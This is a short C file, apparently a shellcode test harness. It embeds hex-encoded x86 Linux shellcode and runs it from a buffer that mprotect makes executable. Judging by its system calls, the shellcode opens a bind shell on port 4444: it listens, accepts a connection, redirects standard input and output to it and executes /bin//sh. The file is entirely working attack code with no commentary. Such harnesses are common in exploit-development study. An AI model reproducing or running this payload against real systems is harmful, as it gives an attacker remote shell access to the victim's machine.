#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <errno.h>
#include <unistd.h>
#include <malloc.h>


unsigned char code[] = \
"\x29\xc0\x31\xdb\x29\xc9\x31\xd2\x29\xf6\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x52\x52\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x29\xd2\xb2\x10\x66\xb8\x69\x01\xcd\x80\x89\xc1\x66\xb8\x6b\x01\xcd\x80\x66\xb8\x6c\x01\xcd\x80\x89\xc3\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x29\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe1\xb0\x0b\xcd\x80";


int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

    int pagesize = getpagesize ();

    printf("Page size: %d\n", pagesize);

    char * buffer = memalign(pagesize, pagesize);

    memcpy(buffer, code, strlen(code));

    int result = mprotect(buffer, pagesize, PROT_READ | PROT_EXEC | PROT_WRITE);

	if (result){
		printf("Memory protection failed: %d\n", errno);

		return 5;
	}

	int (*ret)() = (int(*)())buffer;

	ret();

}

	
